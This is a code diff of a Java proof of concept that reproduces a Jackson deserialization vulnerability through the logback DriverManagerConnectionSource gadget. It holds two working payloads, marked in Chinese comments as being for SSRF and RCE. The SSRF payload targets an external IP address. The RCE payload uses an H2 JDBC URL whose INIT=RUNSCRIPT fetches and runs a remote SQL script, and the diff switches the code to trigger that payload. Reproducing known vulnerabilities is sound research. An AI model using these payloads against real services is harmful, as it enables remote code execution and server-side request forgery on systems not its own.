@@ -6,6 +6,7 @@ import com.fasterxml.jackson.databind.SerializationFeature;
 
 import org.h2.Driver;
 
+
 public class JacksonSerial {
 	
 	/*
@@ -21,11 +22,11 @@ public class JacksonSerial {
 
         //该条payload用于SSRF的复现
 
-        String jsonStr1 = "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:tcp://127.0.0.1:8005/~/test\"}]";
+        String jsonStr1 = "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:tcp://47.104.218.243/ssrf/ssrf.php\"}]";
 
         //该条payload用于RCE的复现
 
-        String jsonStr2 = "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost/inject.sql'\"}]";
+        String jsonStr2 = "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1/inject.sql'\"}]";
 
         ObjectMapper mapper = new ObjectMapper();
 
@@ -35,14 +36,16 @@ public class JacksonSerial {
 
         System.out.println("Serializing");
 
-        Object obj = mapper.readValue(jsonStr1, java.lang.Object.class);
+        Object obj = mapper.readValue(jsonStr2, java.lang.Object.class);
 
         System.out.println("objectified");
-
+        
         System.out.println("stringified: " + mapper.writeValueAsString(obj));
 		}catch(Exception e)
 		{
 			System.out.println(e.toString());
 		}
+		
+		
 	}
 }
